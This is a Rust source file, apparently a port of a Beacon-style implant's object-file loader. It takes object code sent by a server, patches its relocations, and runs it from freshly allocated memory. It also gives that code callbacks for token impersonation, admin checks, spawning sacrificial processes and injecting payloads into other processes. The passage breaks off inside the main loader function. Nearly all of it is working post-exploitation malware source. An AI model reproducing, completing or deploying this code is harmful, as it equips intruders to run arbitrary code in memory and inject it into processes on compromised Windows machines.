//! Port of boff.cpp — the Beacon Object File (BOFF/COFF) loader.
//!
//! A BOFF is a PE/COFF object shipped by the server as
//! `[4b entry][code][rdata][data][relocs][args]`. We fix up its
//! relocations against the `BOFF_FUNCTIONS` table (and any dynamically
//! resolved imports), copy the code to an executable patch, and call the
//! entry point. The `BOFF_FUNCTIONS` layout must match the C struct
//! exactly: the payload is machine code that calls through these slots
//! using the x64 C calling convention.

use core::ffi::c_void;
use core::mem::size_of;
use core::ptr;
use core::slice;

use windows_sys::Win32::Foundation::FreeLibrary;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
};
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;

use crate::beacon::SETTING_PROCINJ_PERMS_I;
use crate::callback::{command_shell_callback, post_error, post_error_d, post_error_dd, post_error_na};
use crate::parse::DataP;
use crate::settings::setting_short;

/* COFF relocation types (coff.h + AMD64 relocations). These mirror the
 * C #defines; a few are only compared in a range check, like in the C. */
#[allow(dead_code)]
const RELOC_ENDTABLE: i16 = 0;
#[allow(dead_code)]
const RELOC_ADDR32: i16 = 6;
#[allow(dead_code)]
const RELOC_REL32: i16 = 20;
const RELOC64_REL32_0: i16 = 4;
#[allow(dead_code)]
const RELOC64_REL32_1: i16 = 5;
#[allow(dead_code)]
const RELOC64_REL32_2: i16 = 6;
#[allow(dead_code)]
const RELOC64_REL32_3: i16 = 7;
#[allow(dead_code)]
const RELOC64_REL32_4: i16 = 8;
const RELOC64_REL32_5: i16 = 9;

/* the "symbols" the server uses to tag each relocation with its target. */
const SYMBOL_RDATA: i16 = 1024;
const SYMBOL_DATA: i16 = 1025;
const SYMBOL_TEXT: i16 = 1026;
const SYMBOL_DYNAMICF: i16 = 1027;
const SYMBOL_END: i16 = 1028;

/// One relocation entry from the reloc stream (`OBJ_RELOC` in boff.cpp).
#[repr(C)]
#[derive(Clone, Copy, Debug, Default)]
pub struct ObjReloc {
    pub rtype: i16,
    pub symbol: i16,
    pub offset: i32,
    pub offset_in_section: i32,
}

impl ObjReloc {
    /// Copy a relocation entry out of the stream. The C code memcpy's the
    /// struct out of the buffer, so this is host byte order.
    fn from_bytes(b: &[u8]) -> ObjReloc {
        ObjReloc {
            rtype: i16::from_ne_bytes([b[0], b[1]]),
            symbol: i16::from_ne_bytes([b[2], b[3]]),
            offset: i32::from_ne_bytes([b[4], b[5], b[6], b[7]]),
            offset_in_section: i32::from_ne_bytes([b[8], b[9], b[10], b[11]]),
        }
    }
}

/// `BOFF_FUNCTIONS` from boff.cpp. Every field is a function pointer; the
/// struct must stay byte-identical with the C definition (31 named slots
/// followed by `other[32]`), because BOFF payloads index it directly.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct BoffFunctions {
    /* APIs to resolve Win32 modules */
    load_library_a: usize,
    free_library: usize,
    get_proc_address: usize,
    get_module_handle_a: usize,

    /* data parser API */
    beacon_data_parse: usize,
    beacon_data_ptr: usize,
    beacon_data_int: usize,
    beacon_data_short: usize,
    beacon_data_length: usize,
    beacon_data_extract: usize,

    /* string builder API */
    beacon_format_alloc: usize,
    beacon_format_reset: usize,
    beacon_format_append: usize,
    beacon_format_printf: usize,
    beacon_format_tostring: usize,
    beacon_format_free: usize,
    beacon_format_int: usize,

    /* output functions */
    beacon_output: usize,
    beacon_printf: usize,
    beacon_error_d: usize,
    beacon_error_dd: usize,
    beacon_error_na: usize,

    /* token functions */
    beacon_use_token: usize,
    beacon_revert_token: usize,
    beacon_is_admin: usize,

    /* spawn and inject */
    beacon_get_spawn_to: usize,
    beacon_inject_process: usize,
    beacon_inject_temporary_process: usize,
    beacon_spawn_temporary_process: usize,
    beacon_cleanup_process: usize,

    /* utility functions */
    to_wide_char: usize,

    /* our other pointers */
    pub other: [usize; 32],
}

impl Default for BoffFunctions {
    fn default() -> Self {
        BoffFunctions {
            load_library_a: 0,
            free_library: 0,
            get_proc_address: 0,
            get_module_handle_a: 0,
            beacon_data_parse: 0,
            beacon_data_ptr: 0,
            beacon_data_int: 0,
            beacon_data_short: 0,
            beacon_data_length: 0,
            beacon_data_extract: 0,
            beacon_format_alloc: 0,
            beacon_format_reset: 0,
            beacon_format_append: 0,
            beacon_format_printf: 0,
            beacon_format_tostring: 0,
            beacon_format_free: 0,
            beacon_format_int: 0,
            beacon_output: 0,
            beacon_printf: 0,
            beacon_error_d: 0,
            beacon_error_dd: 0,
            beacon_error_na: 0,
            beacon_use_token: 0,
            beacon_revert_token: 0,
            beacon_is_admin: 0,
            beacon_get_spawn_to: 0,
            beacon_inject_process: 0,
            beacon_inject_temporary_process: 0,
            beacon_spawn_temporary_process: 0,
            beacon_cleanup_process: 0,
            to_wide_char: 0,
            other: [0; 32],
        }
    }
}

/// The C `datap` struct (parse.h). BOFF payloads allocate this themselves
/// and call our data-parser shims on it, so the layout must match.
#[repr(C)]
struct RawDatap {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

/// The C `formatp` struct (bformat.h).
#[repr(C)]
struct RawFormatp {
    original: *mut u8,
    self_: *mut u8,
    length: i32,
    size: i32,
}

/// The C `datap_buffer` struct (parse.h). Kept for fidelity with the C
/// header even though our shims return raw pointers.
#[allow(dead_code)]
#[repr(C)]
struct RawDatapBuffer {
    buffer: *mut u8,
    length: i32,
}

/// Length of a NUL-terminated C string.
unsafe fn cstr_len(ptr: *const u8) -> usize {
    let mut n = 0usize;
    while *ptr.add(n) != 0 {
        n += 1;
    }
    n
}

/// Borrow a NUL-terminated C string as a byte slice (no NUL).
pub(crate) unsafe fn cstr_slice(ptr: *const u8) -> &'static [u8] {
    slice::from_raw_parts(ptr, cstr_len(ptr))
}

/* ------------------------------------------------------------------ */
/* the two variadic slots (BeaconPrintf / BeaconFormatPrintf) need a   */
/* vsprintf-equivalent. Real BOFs only emit the common specifiers, so  */
/* we format them ourselves; the varargs arrive in the fixed extra     */
/* parameters of the shims below (exactly where the x64 varargs land). */
/* ------------------------------------------------------------------ */

const FLAG_LEFT: u8 = 0x01;
const FLAG_PLUS: u8 = 0x02;
const FLAG_SPACE: u8 = 0x04;
const FLAG_ALT: u8 = 0x08;
const FLAG_ZERO: u8 = 0x10;

fn next_arg(ai: &mut usize, args: &[u64]) -> u64 {
    let v = *args.get(*ai).unwrap_or(&0);
    *ai += 1;
    v
}

fn read_cstr(ptr: u64) -> Vec<u8> {
    if ptr == 0 {
        return b"(null)".to_vec();
    }
    let mut v = Vec::new();
    let mut p = ptr as *const u8;
    unsafe {
        loop {
            let b = *p;
            if b == 0 {
                break;
            }
            v.push(b);
            p = p.add(1);
        }
    }
    v
}

fn read_wide_cstr(ptr: u64) -> Vec<u8> {
    if ptr == 0 {
        return b"(null)".to_vec();
    }
    let mut v: Vec<u16> = Vec::new();
    let mut p = ptr as *const u16;
    unsafe {
        loop {
            let c = *p;
            if c == 0 {
                break;
            }
            v.push(c);
            p = p.add(1);
        }
    }
    String::from_utf16_lossy(&v).into_bytes()
}

fn pad_and_push(out: &mut Vec<u8>, s: &[u8], flags: u8, width: usize) {
    if s.len() >= width {
        out.extend_from_slice(s);
        return;
    }
    let pad = width - s.len();
    if flags & FLAG_LEFT != 0 {
        out.extend_from_slice(s);
        out.extend(core::iter::repeat(b' ').take(pad));
    } else {
        out.extend(core::iter::repeat(b' ').take(pad));
        out.extend_from_slice(s);
    }
}

fn push_int(
    out: &mut Vec<u8>,
    v: u64,
    base: u32,
    upper: bool,
    flags: u8,
    width: usize,
    precision: Option<usize>,
) {
    let negative = (v as i64) < 0;
    let mag = if negative { (v as i64).unsigned_abs() } else { v };

    // digits (least significant first, then reversed)
    let mut digits: Vec<u8> = Vec::new();
    let mut m = mag;
    if m == 0 {
        digits.push(b'0');
    }
    while m > 0 {
        let d = (m % base as u64) as u8;
        digits.push(if d < 10 {
            b'0' + d
        } else if upper {
            b'A' + (d - 10)
        } else {
            b'a' + (d - 10)
        });
        m /= base as u64;
    }
    digits.reverse();

    // precision = minimum number of digits
    if let Some(p) = precision {
        if digits.len() < p {
            let mut z = vec![b'0'; p - digits.len()];
            z.append(&mut digits);
            digits = z;
        }
    }

    // sign / prefix
    let mut prefix: Vec<u8> = Vec::new();
    if negative {
        prefix.push(b'-');
    } else if flags & FLAG_PLUS != 0 {
        prefix.push(b'+');
    } else if flags & FLAG_SPACE != 0 {
        prefix.push(b' ');
    }
    if flags & FLAG_ALT != 0 && base == 16 && mag != 0 {
        if upper {
            prefix.extend_from_slice(b"0X");
        } else {
            prefix.extend_from_slice(b"0x");
        }
    }

    let zero_pad = flags & FLAG_ZERO != 0 && flags & FLAG_LEFT == 0 && precision.is_none();
    let total = prefix.len() + digits.len();

    if !zero_pad && flags & FLAG_LEFT == 0 && width > total {
        out.extend(core::iter::repeat(b' ').take(width - total));
    }
    out.extend_from_slice(&prefix);
    if zero_pad && width > total {
        out.extend(core::iter::repeat(b'0').take(width - total));
    }
    out.extend_from_slice(&digits);
    if flags & FLAG_LEFT != 0 && width > total {
        out.extend(core::iter::repeat(b' ').take(width - total));
    }
}

/// Minimal `vsprintf`-style formatter used by the BeaconPrintf /
/// BeaconFormatPrintf shims. Supports `%[flags][width][.precision]
/// [length]d i u o x X c s p S` and `%%`. Returns `None` on a specifier
/// we do not support (the caller then skips the output, like a failed
/// `vsprintf_s`).
pub(crate) fn format_string(fmt: &[u8], args: &[u64]) -> Option<Vec<u8>> {
    let mut out: Vec<u8> = Vec::new();
    let mut ai = 0usize;
    let mut i = 0usize;

    while i < fmt.len() {
        let c = fmt[i];
        if c != b'%' {
            out.push(c);
            i += 1;
            continue;
        }
        i += 1;
        if i >= fmt.len() {
            return None;
        }
        if fmt[i] == b'%' {
            out.push(b'%');
            i += 1;
            continue;
        }

        // flags
        let mut flags = 0u8;
        while i < fmt.len() && matches!(fmt[i], b'-' | b'+' | b' ' | b'#' | b'0') {
            flags |= match fmt[i] {
                b'-' => FLAG_LEFT,
                b'+' => FLAG_PLUS,
                b' ' => FLAG_SPACE,
                b'#' => FLAG_ALT,
                b'0' => FLAG_ZERO,
                _ => 0,
            };
            i += 1;
        }
        // width
        let mut width = 0usize;
        while i < fmt.len() && fmt[i].is_ascii_digit() {
            width = width
                .saturating_mul(10)
                .saturating_add((fmt[i] - b'0') as usize);
            i += 1;
        }
        // precision
        let mut precision: Option<usize> = None;
        if i < fmt.len() && fmt[i] == b'.' {
            i += 1;
            let mut p = 0usize;
            while i < fmt.len() && fmt[i].is_ascii_digit() {
                p = p.saturating_mul(10).saturating_add((fmt[i] - b'0') as usize);
                i += 1;
            }
            precision = Some(p);
        }
        // length modifier: 0=none 1=hh 2=h 3=l 4=ll 5=z 6=j 7=t
        let mut lenmod = 0u8;
        if i < fmt.len() {
            match fmt[i] {
                b'h' => {
                    if i + 1 < fmt.len() && fmt[i + 1] == b'h' {
                        lenmod = 1;
                        i += 2;
                    } else {
                        lenmod = 2;
                        i += 1;
                    }
                }
                b'l' => {
                    if i + 1 < fmt.len() && fmt[i + 1] == b'l' {
                        lenmod = 4;
                        i += 2;
                    } else {
                        lenmod = 3;
                        i += 1;
                    }
                }
                b'z' => {
                    lenmod = 5;
                    i += 1;
                }
                b'j' => {
                    lenmod = 6;
                    i += 1;
                }
                b't' => {
                    lenmod = 7;
                    i += 1;
                }
                _ => {}
            }
        }
        if i >= fmt.len() {
            return None;
        }
        let conv = fmt[i];
        i += 1;

        match conv {
            b'd' | b'i' => {
                let raw = next_arg(&mut ai, args);
                let v: i64 = match lenmod {
                    1 => (raw as u8) as i8 as i64,
                    2 => (raw as u16) as i16 as i64,
                    3 | 5 | 6 | 7 => (raw as u32) as i32 as i64, // long is 32-bit on Windows
                    4 => raw as i64,
                    _ => (raw as u32) as i32 as i64,
                };
                push_int(&mut out, v as u64, 10, false, flags, width, precision);
            }
            b'u' | b'o' | b'x' | b'X' => {
                let raw = next_arg(&mut ai, args);
                let v: u64 = match lenmod {
                    1 => (raw as u8) as u64,
                    2 => (raw as u16) as u64,
                    3 | 5 | 7 => (raw as u32) as u64,
                    4 | 6 => raw,
                    _ => (raw as u32) as u64,
                };
                let base = if conv == b'o' {
                    8
                } else if conv == b'x' || conv == b'X' {
                    16
                } else {
                    10
                };
                push_int(&mut out, v, base, conv == b'X', flags, width, precision);
            }
            b'c' => {
                let raw = next_arg(&mut ai, args);
                if lenmod == 3 {
                    let ch = char::from_u32(raw as u32).unwrap_or('\u{FFFD}');
                    let mut buf = [0u8; 4];
                    out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                } else {
                    out.push((raw & 0xff) as u8);
                }
            }
            b's' | b'S' => {
                let raw = next_arg(&mut ai, args);
                let wide = conv == b'S' || lenmod == 3;
                let s = if wide {
                    read_wide_cstr(raw)
                } else {
                    read_cstr(raw)
                };
                let s = match precision {
                    Some(p) => s.iter().take(p).copied().collect::<Vec<u8>>(),
                    None => s,
                };
                pad_and_push(&mut out, &s, flags, width);
            }
            b'p' => {
                let raw = next_arg(&mut ai, args);
                let w = core::mem::size_of::<usize>() * 2;
                let digits = format!("{:0width$x}", raw, width = w);
                pad_and_push(&mut out, digits.as_bytes(), flags, w.max(width));
            }
            _ => return None,
        }
    }
    Some(out)
}

/* ------------------------------------------------------------------ */
/* shims: the BOFF_FUNCTIONS table points at these. All are `extern     */
/* "C"` so machine code can call them with the x64 C calling convention.*/
/* ------------------------------------------------------------------ */

/// data_init(datap *, char * buffer, int size)
extern "C" fn data_init_shim(temp: *mut RawDatap, buffer: *mut u8, size: i32) {
    unsafe {
        (*temp).original = buffer;
        (*temp).buffer = buffer;
        (*temp).length = size;
        (*temp).size = size;
    }
}

/// data_ptr(datap *, int length)
extern "C" fn data_ptr_shim(d: *mut RawDatap, length: i32) -> *mut u8 {
    unsafe {
        if (*d).length < length {
            return ptr::null_mut();
        }
        let p = (*d).buffer;
        (*d).buffer = (*d).buffer.add(length as usize);
        (*d).length -= length;
        p
    }
}

/// data_int(datap *) — network order
extern "C" fn data_int_shim(d: *mut RawDatap) -> u32 {
    unsafe {
        if (*d).length < 4 {
            return 0;
        }
        let mut b = [0u8; 4];
        ptr::copy_nonoverlapping((*d).buffer, b.as_mut_ptr(), 4);
        (*d).buffer = (*d).buffer.add(4);
        (*d).length -= 4;
        u32::from_be_bytes(b)
    }
}

/// data_short(datap *) — network order
extern "C" fn data_short_shim(d: *mut RawDatap) -> u16 {
    unsafe {
        if (*d).length < 2 {
            return 0;
        }
        let mut b = [0u8; 2];
        ptr::copy_nonoverlapping((*d).buffer, b.as_mut_ptr(), 2);
        (*d).buffer = (*d).buffer.add(2);
        (*d).length -= 2;
        u16::from_be_bytes(b)
    }
}

/// data_length(datap *)
extern "C" fn data_length_shim(d: *mut RawDatap) -> i32 {
    unsafe { (*d).length }
}

/// data_ptr_extract(datap *, int * size) — this is what the table's
/// BeaconDataExtract slot points at.
extern "C" fn data_ptr_extract_shim(d: *mut RawDatap, size: *mut i32) -> *mut u8 {
    let length = data_int_shim(d);
    let buffer = data_ptr_shim(d, length as i32);
    if !size.is_null() {
        unsafe { *size = length as i32 };
    }
    if length == 0 {
        return ptr::null_mut();
    }
    buffer
}

/// bformat_init(formatp *, int maxsz)
extern "C" fn bformat_init_shim(buffer: *mut RawFormatp, maxsz: i32) {
    let mut data = vec![0u8; maxsz as usize];
    let p = data.as_mut_ptr();
    core::mem::forget(data); // owned again by bformat_free_shim
    unsafe {
        (*buffer).original = p;
        (*buffer).self_ = p;
        (*buffer).length = 0;
        (*buffer).size = maxsz;
    }
}

/// bformat_reset(formatp *)
extern "C" fn bformat_reset_shim(buffer: *mut RawFormatp) {
    unsafe {
        (*buffer).self_ = (*buffer).original;
        (*buffer).length = 0;
        // the C code memsets with the (now zero) length: a no-op
        ptr::write_bytes((*buffer).original, 0, (*buffer).length as usize);
    }
}

/// bformat_int(formatp *, int value) — htonl + copy
extern "C" fn bformat_int_shim(buffer: *mut RawFormatp, value: i32) {
    let be = value.to_be_bytes();
    bformat_copy_shim(buffer, be.as_ptr() as *mut u8, 4);
}

/// bformat_copy(formatp *, char * src, int length)
extern "C" fn bformat_copy_shim(buffer: *mut RawFormatp, src: *mut u8, length: i32) {
    unsafe {
        if length >= ((*buffer).size - (*buffer).length) || length == 0 {
            return;
        }
        if src.is_null() {
            return;
        }
        ptr::copy_nonoverlapping(src, (*buffer).self_, length as usize);
        (*buffer).self_ = (*buffer).self_.add(length as usize);
        (*buffer).length += length;
    }
}

/// bformat_printf(formatp *, char * fmt, ...)
extern "C" fn bformat_printf_shim(
    buffer: *mut RawFormatp,
    fmt: *const u8,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
) {
    if fmt.is_null() {
        return;
    }
    let fmt_slice = unsafe { cstr_slice(fmt) };
    let args = [a1, a2, a3, a4, a5, a6, a7, a8];
    let Some(out) = format_string(fmt_slice, &args) else { return };
    let est = out.len() as i32;
    if est <= 0 {
        return;
    }
    unsafe {
        let remaining = (*buffer).size - (*buffer).length;
        if est >= remaining {
            return;
        }
        ptr::copy_nonoverlapping(out.as_ptr(), (*buffer).self_, out.len());
        // vsprintf_s NUL-terminates; the length does not include the NUL
        (*buffer).self_.add(out.len()).write(0);
        (*buffer).self_ = (*buffer).self_.add(out.len());
        (*buffer).length += est;
    }
}

/// bformat_tostring(formatp *, int * size)
extern "C" fn bformat_tostring_shim(buffer: *mut RawFormatp, size: *mut i32) -> *mut u8 {
    unsafe {
        let len = (*buffer).length;
        if !size.is_null() {
            *size = len;
        }
        if size.is_null() {
            return ptr::null_mut();
        }
        (*buffer).original
    }
}

/// bformat_free(formatp *)
extern "C" fn bformat_free_shim(buffer: *mut RawFormatp) {
    unsafe {
        if (*buffer).original.is_null() {
            return;
        }
        // forensically clean, then give the allocation back
        ptr::write_bytes((*buffer).original, 0, (*buffer).size as usize);
        let size = (*buffer).size as usize;
        let v = Vec::from_raw_parts((*buffer).original, size, size);
        drop(v);
    }
}

/// BeaconOutput — postmsg(int type, char * msg, int len)
pub(crate) extern "C" fn postmsg_shim(type_: i32, msg: *mut u8, len: i32) {
    let data: &[u8] = if msg.is_null() || len <= 0 {
        &[]
    } else {
        unsafe { slice::from_raw_parts(msg, len as usize) }
    };
    command_shell_callback(data, len, type_);
}

/// BeaconPrintf — postmsgf(int type, char * fmt, ...)
extern "C" fn postmsgf_shim(
    type_: i32,
    fmt: *const u8,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
) {
    if fmt.is_null() {
        return;
    }
    let fmt_slice = unsafe { cstr_slice(fmt) };
    let args = [a1, a2, a3, a4, a5, a6, a7, a8];
    if let Some(out) = format_string(fmt_slice, &args) {
        if out.is_empty() {
            return;
        }
        command_shell_callback(&out, out.len() as i32, type_);
    }
}

/// BeaconErrorD — post_error_d(int error, int arg)
extern "C" fn post_error_d_shim(error: i32, arg: i32) {
    post_error_d(error, arg);
}

/// BeaconErrorDD — post_error_dd(int error, int arg, int arg2)
extern "C" fn post_error_dd_shim(error: i32, arg: i32, arg2: i32) {
    post_error_dd(error, arg, arg2);
}

/// BeaconErrorNA — post_error_na(int error)
extern "C" fn post_error_na_shim(error: i32) {
    post_error_na(error);
}

/// BeaconUseToken — use_token_a(HANDLE token)
extern "C" fn use_token_a_shim(token: *mut c_void) -> i32 {
    let mut mem = [0u8; 256];
    let result = crate::tokens::use_token(token as isize, &mut mem, 256);
    mem.fill(0);
    result as i32
}

/// BeaconRevertToken — command_rev2self()
extern "C" fn command_rev2self_shim() {
    crate::tokens::command_rev2self();
}

/// BeaconIsAdmin — is_admin()
extern "C" fn is_admin_shim() -> i32 {
    crate::tokens::is_admin() as i32
}

/// BeaconGetSpawnTo — getspawnproc(BOOL x86, char * buff, int len)
extern "C" fn getspawnproc_shim(x86: i32, buff: *mut u8, len: i32) {
    let mut proc = [0u8; 256];
    crate::process::spawn_populate(x86 != 0, &mut proc);
    let copy = if len < 256 { len as usize } else { 256 };
    if copy > 0 && !buff.is_null() {
        unsafe { ptr::copy_nonoverlapping(proc.as_ptr(), buff, copy) };
    }
}

fn payload_slice(p: *mut u8, len: i32) -> &'static [u8] {
    if p.is_null() || len <= 0 {
        &[]
    } else {
        unsafe { slice::from_raw_parts(p, len as usize) }
    }
}

/// BeaconInjectProcess — inject_explicit_process(HANDLE, int pid, ...)
extern "C" fn inject_explicit_process_shim(
    h_process: *mut c_void,
    pid: i32,
    payload: *mut u8,
    p_len: i32,
    p_offset: i32,
    arg: *mut u8,
    a_len: i32,
) {
    crate::inject::inject_process_logic(
        ptr::null_mut(),
        h_process as isize,
        pid as u32,
        payload_slice(payload, p_len),
        p_len as usize,
        p_offset,
        arg as *mut c_void,
        a_len as usize,
    );
}

/// BeaconInjectTemporaryProcess — inject_temp_process(PROCESS_INFORMATION *, ...)
extern "C" fn inject_temp_process_shim(
    pi: *mut PROCESS_INFORMATION,
    payload: *mut u8,
    plen: i32,
    off: i32,
    arg: *mut u8,
    alen: i32,
) {
    if pi.is_null() {
        return;
    }
    unsafe {
        crate::inject::inject_process_logic(
            pi as *mut c_void,
            (*pi).hProcess as isize,
            (*pi).dwProcessId,
            payload_slice(payload, plen),
            plen as usize,
            off,
            arg as *mut c_void,
            alen as usize,
        );
    }
}

/// BeaconSpawnTemporaryProcess — spawn_patsy(BOOL x86, BOOL ignoreToken, ...)
extern "C" fn spawn_patsy_shim(
    x86: i32,
    ignore_token: i32,
    si: *mut c_void,
    pi: *mut c_void,
) -> i32 {
    crate::process::spawn_patsy(x86 != 0, ignore_token != 0, si, pi) as i32
}

/// BeaconCleanupProcess — cleanupProcess(PROCESS_INFORMATION *)
extern "C" fn cleanup_process_shim(pi: *mut PROCESS_INFORMATION) {
    if !pi.is_null() {
        unsafe { crate::jobs::cleanup_process(&*pi) };
    }
}

/// toWideChar(char * src, wchar_t * dst, int max)
extern "C" fn to_wide_char_shim(src: *mut u8, dst: *mut u16, max: i32) -> i32 {
    if src.is_null() || dst.is_null() || max <= 0 {
        return 0;
    }
    let slen = unsafe { cstr_len(src) };
    let src_slice = unsafe { slice::from_raw_parts(src, slen) };
    let dst_slice = unsafe { slice::from_raw_parts_mut(dst, max as usize) };
    crate::commands::to_wide_char(src_slice, dst_slice, max as usize) as i32
}

/* ------------------------------------------------------------------ */

/// Find a slot for a dynamically resolved function (`function_slot` in
/// boff.cpp). Returns a pointer to the slot, or NULL if `other[]` is full.
pub fn function_slot(f: &mut BoffFunctions, ptr: usize) -> *mut usize {
    /* try and find our pointer and return a pointer to it! */
    for x in 0..32 {
        if f.other[x] == ptr {
            return &mut f.other[x] as *mut usize;
        }
    }
    /* OK, find a NULL pointer and return a pointer to that */
    for x in 0..32 {
        if f.other[x] == 0 {
            f.other[x] = ptr;
            return &mut f.other[x] as *mut usize;
        }
    }
    ptr::null_mut()
}

/// Fill in the fixed API slots (`setup_functions` in boff.cpp).
pub fn setup_functions(f: &mut BoffFunctions) {
    /* clear all of these pointers, please */
    *f = BoffFunctions::default();

    /* setup some of our fixed APIs */
    f.load_library_a = LoadLibraryA as *const () as usize;
    f.free_library = FreeLibrary as *const () as usize;
    f.get_proc_address = GetProcAddress as *const () as usize;
    f.get_module_handle_a = GetModuleHandleA as *const () as usize;

    /* data parser API */
    f.beacon_data_parse = data_init_shim as *const () as usize;
    f.beacon_data_ptr = data_ptr_shim as *const () as usize;
    f.beacon_data_int = data_int_shim as *const () as usize;
    f.beacon_data_short = data_short_shim as *const () as usize;
    f.beacon_data_length = data_length_shim as *const () as usize;
    f.beacon_data_extract = data_ptr_extract_shim as *const () as usize;

    /* beacon format API */
    f.beacon_format_alloc = bformat_init_shim as *const () as usize;
    f.beacon_format_reset = bformat_reset_shim as *const () as usize;
    f.beacon_format_printf = bformat_printf_shim as *const () as usize;
    f.beacon_format_append = bformat_copy_shim as *const () as usize;
    f.beacon_format_free = bformat_free_shim as *const () as usize;
    f.beacon_format_tostring = bformat_tostring_shim as *const () as usize;
    f.beacon_format_int = bformat_int_shim as *const () as usize;

    /* our output functions */
    f.beacon_output = postmsg_shim as *const () as usize;
    f.beacon_printf = postmsgf_shim as *const () as usize;
    f.beacon_error_d = post_error_d_shim as *const () as usize;
    f.beacon_error_dd = post_error_dd_shim as *const () as usize;
    f.beacon_error_na = post_error_na_shim as *const () as usize;

    /* token API */
    f.beacon_use_token = use_token_a_shim as *const () as usize;
    f.beacon_is_admin = is_admin_shim as *const () as usize;
    f.beacon_revert_token = command_rev2self_shim as *const () as usize;

    /* spawn and inject APIs */
    f.beacon_get_spawn_to = getspawnproc_shim as *const () as usize;
    f.beacon_cleanup_process = cleanup_process_shim as *const () as usize;
    f.beacon_inject_process = inject_explicit_process_shim as *const () as usize;
    f.beacon_spawn_temporary_process = spawn_patsy_shim as *const () as usize;
    f.beacon_inject_temporary_process = inject_temp_process_shim as *const () as usize;

    /* utility functions */
    f.to_wide_char = to_wide_char_shim as *const () as usize;
}

/*
 * Fix one relocation. execsrc is the source of the executable code (we
 * lift offsets out of it), execdst the planned destination (we compute
 * RIP-relative deltas against it), and symbol the base of whatever the
 * relocation points at. Returns FALSE (after reporting) on failure, in
 * which case the BOFF must not run.
 */
pub fn process_reloc(reloc: &ObjReloc, execsrc: *mut u8, execdst: *mut u8, symbol: *mut u8, soff: i32) -> bool {
    #[cfg(target_arch = "x86")]
    {
        if reloc.rtype == RELOC_ADDR32 {
            let mut offset: u32 = 0;
            unsafe { ptr::copy_nonoverlapping(execsrc.add(reloc.offset as usize), &mut offset as *mut u32 as *mut u8, 4) };
            let addr = (symbol as u32).wrapping_add(offset).wrapping_add(soff as u32);
            unsafe { ptr::copy_nonoverlapping(&addr as *const u32 as *const u8, execsrc.add(reloc.offset as usize), 4) };
            return true;
        } else if reloc.rtype == RELOC_REL32 {
            /* RIP of where this data will be ref'd from */
            let rip = (execdst as u32).wrapping_add(reloc.offset as u32).wrapping_add(4);
            let mut offset: u32 = 0;
            unsafe { ptr::copy_nonoverlapping(execsrc.add(reloc.offset as usize), &mut offset as *mut u32 as *mut u8, 4) };
            /* the location of our target */
            let addr = (symbol as u32).wrapping_add(offset).wrapping_add(soff as u32);
            let addr = addr.wrapping_sub(rip);
            unsafe { ptr::copy_nonoverlapping(&addr as *const u32 as *const u8, execsrc.add(reloc.offset as usize), 4) };
            return true;
        }
    }
    #[cfg(target_arch = "x86_64")]
    {
        if reloc.rtype >= RELOC64_REL32_0 && reloc.rtype <= RELOC64_REL32_5 {
            /*
             * RELOC64_REL32_0 means the RIP is at the end of this encoded
             * instruction and our offset is the last 4 bytes; the other
             * values mean the relocation offset is tucked into the middle
             * of the instruction, so reloc->rtype doubles as the distance
             * from the patched offset to the next instruction.
             */
            let rip = (execdst as usize + reloc.offset as usize + reloc.rtype as usize) as i64;
            let mut offset: u32 = 0;
            unsafe { ptr::copy_nonoverlapping(execsrc.add(reloc.offset as usize), &mut offset as *mut u32 as *mut u8, 4) };
            let fsymbol = symbol as usize as i64 + offset as i64 + soff as i64;

            /* make sure the delta fits in 4 bytes */
            let check = fsymbol - rip;
            if check > i32::MAX as i64 || check < i32::MIN as i64 {
                post_error_na(0x4d);
                return false;
            }
            let addr = check as u32;
            unsafe { ptr::copy_nonoverlapping(&addr as *const u32 as *const u8, execsrc.add(reloc.offset as usize), 4) };
            return true;
        }
    }
    post_error_d(0x4f, reloc.rtype as i32);
    false
}

/// `command_inline_execute_object` from boff.cpp — parse a BOFF, resolve
/// its relocations, and run it.
pub fn command_inline_execute_object(buffer: &[u8], length: usize) {
    /* setup our function table */
    let mut ftable = BoffFunctions::default();
    setup_functions(&mut ftable);

    /* extract our arguments: [4b entry][code][rdata][data][relocs][args] */
    let mut parser = DataP::init(&buffer[..length]);
    let entry = parser.data_int() as usize;
    let Some(mut code) = parser.data_extract() else { return };
    let Some(rdata) = parser.data_extract() else { return };
    let Some(data_sec) = parser.data_extract() else { return };
    let Some(relocs) = parser.data_extract() else { return };
    let Some(args) = parser.data_extract() else { return };

    let execpatch = unsafe {
        VirtualAlloc(
            ptr::null(),
            code.length,
            MEM_RESERVE | MEM_COMMIT,
            setting_short(SETTING_PROCINJ_PERMS_I) as u32,
        )
    } as *mut u8;
    if execpatch.is_null() {
        return;
    }

    /* walk our relocations and fix code.buffer */
    let mut rparser = DataP::init(&relocs.buffer);
    let mut success = false;
    loop {
        /* grab our relocation object (copy the 12 bytes out so the
         * parser stays usable for the DYNAMICF strings below) */
        let reloc = {
            let Some(reloc_slice) = rparser.data_ptr(size_of::<ObjReloc>()) else { break };
            ObjReloc::from_bytes(reloc_slice)
        };
        let code_src = code.buffer.as_ptr() as *mut u8;

        if reloc.symbol == SYMBOL_END {
            /* we're done successfully */
            success = true;
            break;
        } else if reloc.symbol == SYMBOL_RDATA {
            /* pointer to .rdata, which has all of our strings */
            if !process_reloc(&reloc, code_src, execpatch, rdata.buffer.as_ptr() as *mut u8, reloc.offset_in_section) {
                break;
            }
        } else if reloc.symbol == SYMBOL_DATA {
            if !process_reloc(&reloc, code_src, execpatch, data_sec.buffer.as_ptr() as *mut u8, reloc.offset_in_section) {
                break;
            }
        } else if reloc.symbol == SYMBOL_TEXT {
            if !process_reloc(&reloc, code_src, execpatch, execpatch, reloc.offset_in_section) {
                break;
            }
        } else if reloc.symbol == SYMBOL_DYNAMICF {
            /* rip the library and function names out of the stream */
            let lib = match rparser.data_string_asciiz() {
                Some(l) => l.to_vec(),
                None => break,
            };
            let fun = match rparser.data_string_asciiz() {
                Some(f) => f.to_vec(),
                None => break,
            };
